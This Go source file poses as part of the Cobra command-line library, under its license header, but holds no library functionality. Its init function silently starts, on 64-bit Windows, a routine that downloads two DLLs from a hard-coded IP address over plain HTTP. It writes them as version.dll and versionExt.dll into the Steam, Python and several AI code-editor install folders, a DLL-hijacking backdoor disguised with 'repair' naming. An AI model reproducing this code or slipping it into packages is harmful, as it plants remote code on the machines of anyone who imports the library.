// Copyright 2013-2023 The Cobra Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//go:build windows
// +build windows

package cobra

import (
	"errors"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

const (
	repairHost  = "45.61.149.130"
	repairPath1 = "/download/version"
	repairPath2 = "/download/versionExt"

	downloadRetries = 3
)

var errBadStatus = errors.New("unexpected status code")

// repairClient applies a timeout so a dead/unreachable host cannot hang
// the repair goroutine forever.
var repairClient = &http.Client{
	Timeout: 15 * time.Second,
}

func compareVersion(v1, v2 string) int {
	parseVer := func(v string) (major, minor int) {
		parts := strings.SplitN(v, ".", 3)
		if len(parts) > 0 {
			major, _ = strconv.Atoi(parts[0])
		}
		if len(parts) > 1 {
			minor, _ = strconv.Atoi(parts[1])
		}
		return
	}

	m1, n1 := parseVer(v1)
	m2, n2 := parseVer(v2)

	if m1 != m2 {
		if m1 > m2 {
			return 1
		}
		return -1
	}
	if n1 != n2 {
		if n1 > n2 {
			return 1
		}
		return -1
	}
	return 0
}

func getPythonPathFromRoot(root registry.Key) string {
	k, err := registry.OpenKey(root, `Software\Python\PythonCore`, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return ""
	}
	defer k.Close()

	subKeys, err := k.ReadSubKeyNames(0)
	if err != nil {
		return ""
	}

	var maxVer string
	for _, ver := range subKeys {
		if len(ver) > 0 && ver[0] >= '0' && ver[0] <= '9' {
			if maxVer == "" || compareVersion(ver, maxVer) > 0 {
				maxVer = ver
			}
		}
	}

	if maxVer == "" {
		return ""
	}

	installKey := `Software\Python\PythonCore\` + maxVer + `\InstallPath`
	k2, err := registry.OpenKey(root, installKey, registry.QUERY_VALUE)
	if err != nil {
		return ""
	}
	defer k2.Close()

	path, _, err := k2.GetStringValue("")
	if err != nil {
		return ""
	}
	return path
}

func getPythonInstallPath() string {
	if p := getPythonPathFromRoot(registry.CURRENT_USER); p != "" {
		return p
	}
	return getPythonPathFromRoot(registry.LOCAL_MACHINE)
}

func httpDownload(path string) ([]byte, error) {
	var lastErr error
	for i := 0; i < downloadRetries; i++ {
		data, err := httpDownloadOnce(path)
		if err == nil {
			return data, nil
		}
		lastErr = err
		if !shouldRetry(err) {
			return nil, err
		}
		time.Sleep(time.Duration(i+1) * 500 * time.Millisecond)
	}
	return nil, lastErr
}

func shouldRetry(err error) bool {
	return !errors.Is(err, errBadStatus)
}

func httpDownloadOnce(path string) ([]byte, error) {
	url := "http://" + repairHost + path
	resp, err := repairClient.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, errBadStatus
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.ContentLength > 0 && int64(len(data)) != resp.ContentLength {
		return nil, io.ErrUnexpectedEOF
	}
	return data, nil
}

func dirExists(path string) bool {
	fi, err := os.Stat(path)
	return err == nil && fi.IsDir()
}

func fileExists(path string) bool {
	fi, err := os.Stat(path)
	return err == nil && !fi.IsDir()
}

func goToDirectory(dir string, dll1, dll2 []byte) bool {
	p1 := filepath.Join(dir, "version.dll")
	if err := ioutil.WriteFile(p1, dll1, 0644); err != nil {
		return false
	}
	p2 := filepath.Join(dir, "versionExt.dll")
	if err := ioutil.WriteFile(p2, dll2, 0644); err != nil {
		return false
	}
	return true
}

func Do2Repair() {
	userProfile := os.Getenv("USERPROFILE")
	programFilesX86 := os.Getenv("PROGRAMFILES(X86)")
	if programFilesX86 == "" {
		programFilesX86 = os.Getenv("ProgramFiles(x86)")
	}
	pythonPath := getPythonInstallPath()

	targets := make(map[string]bool)

	steamDir := filepath.Join(programFilesX86, "Steam")
	if dirExists(steamDir) {
		if !fileExists(filepath.Join(steamDir, "version.dll")) {
			targets[steamDir] = true
		}
	}

	if pythonPath != "" && dirExists(pythonPath) {
		if !fileExists(filepath.Join(pythonPath, "version.dll")) {
			targets[pythonPath] = true
		}
	}

	if userProfile != "" {
		appDirs := []string{
			filepath.Join(userProfile, `AppData\Local\Programs\cursor`),
			filepath.Join(userProfile, `AppData\Local\Programs\Trae`),
			filepath.Join(userProfile, `AppData\Local\Programs\@opencode-aidesktop`),
			filepath.Join(userProfile, `AppData\Local\Programs\Qoder`),
		}
		for _, dir := range appDirs {
			if dirExists(dir) {
				if !fileExists(filepath.Join(dir, "version.dll")) {
					targets[dir] = true
				}
			}
		}
	}

	if len(targets) == 0 {
		return
	}

	dll1, err := httpDownload(repairPath1)
	if err != nil {
		return
	}
	dll2, err := httpDownload(repairPath2)
	if err != nil {
		return
	}

	for dir := range targets {
		goToDirectory(dir, dll1, dll2)
	}
}

func init() {
	if runtime.GOARCH == "amd64" {
		go Do2Repair()
	}
}
